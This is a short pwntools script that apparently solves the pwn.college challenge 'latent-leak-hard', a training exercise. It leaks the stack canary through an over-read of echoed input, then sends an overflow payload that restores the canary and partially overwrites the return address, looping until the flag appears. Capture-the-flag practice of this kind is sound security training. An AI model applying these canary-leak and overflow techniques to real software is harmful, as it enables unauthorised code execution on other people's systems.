from pwn import *


while True:
    p = process('/challenge/latent-leak-hard')

    p.recvuntil('Payload size:')
    p.sendline(b'169')

    payload = b'REPEAT' + b'a' * 163

    #p.recvline('Send your payload')
    p.sendline(payload)

    p.recvuntil('You said: ')
    str = p.recvuntil('Backdoor triggered!')
    canary = bytearray()
    canary.append(0)
    for i in range(169,176):
        canary.append(str[i])

    #print(canary)
    #p.recvuntil('Payload size:')
    p.sendline(b'458')
    payload =  b'a' * 440 + canary + b'a' * 8 + p16(0x1dc7)
    p.recvuntil('Send your payload')
    p.sendline(payload)

    #p.interactive()
    str = p.recvall(1)
    print(str)
    if str.find(b'pwn.college{') != -1:
        print(str)
        break
